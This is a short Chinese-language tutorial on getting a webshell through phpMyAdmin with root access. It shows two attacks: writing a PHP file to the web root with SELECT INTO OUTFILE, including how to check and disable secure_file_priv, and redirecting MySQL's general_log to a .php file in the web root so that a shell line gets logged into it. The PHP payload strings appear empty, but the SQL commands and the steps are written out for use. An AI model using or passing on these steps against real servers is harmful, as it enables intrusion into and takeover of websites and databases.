phpmyadmin，getshell的方法

getshell前提：phpmyadmin以root权限登陆。

Phpmyadmin getshell一般情况下，有两种操作方式：

1、sql语句into outfile写入getshell（前提：需要知道网站根目录）

​ 执行 Select ““ into outfile “C:/phpStudy/PHPTutorial/WWW/a.php”;

会出现 // #1290 -The MYSQL server is running with the –secure-file-priv option so it cannot execute this statement 错误，原因是mysql正在使用–secure-file-priv选项运行，所以它无法执行这条sql语句。

Show global variables like “%secure_file_priv%” //查看secure_file_priv文件的配置情况

Secure_file_priv为NULL时，mysql不允许导入导出

Secure_file_priv为/tmp时，mysql只能在/tmp目录中执行导入导出

Secure_file_priv没有值时，不限制mysql的导入导出。

想要into outfile写入数据就需要在mysql文件夹下修改my.ini文件，在my.ini文件中加入secure_file_priv=””，就可以实现into outfile写入数据了。

sql语句into outfile和into dumpfile的区别：

into outfile函数会在行末端写入新行，还会转义换行符，就会破坏二进制文件。

into dumpfile可以完整的导出一个二进制文件。因为into dumpfile函数不对任何列或者行进行终止，也不执行任何转义处理。

2、Mysql日志写webshell

mysql每执行一个语句，就会把sql语句写入到日志文件中，但是默认情况下，这个选项时关闭的。

因此，需要去开启这个选项，再设置日志路径，日志路径设置为网站根目录，日志文件名字改为.php结尾的文件。

Show global variables like “%genera%”; //查询general文件的配置情况.

Set global general_log=’on’; //开启general log日志。

Set global general_log_file=’C:/phpStudy/PHPTutorial/WWW/500.php’; //设置日志文件保存路径。

执行任意的sql语句，就能把内容存储到.php文件中。

​ select ““; //一句话写入日志文件。

​ set global general_log=’off’; //关闭general_log日志

​

phpmyadmin，getshell的核心：

​ 1、找到网站的绝对路径

​ 2、执行sql语句。
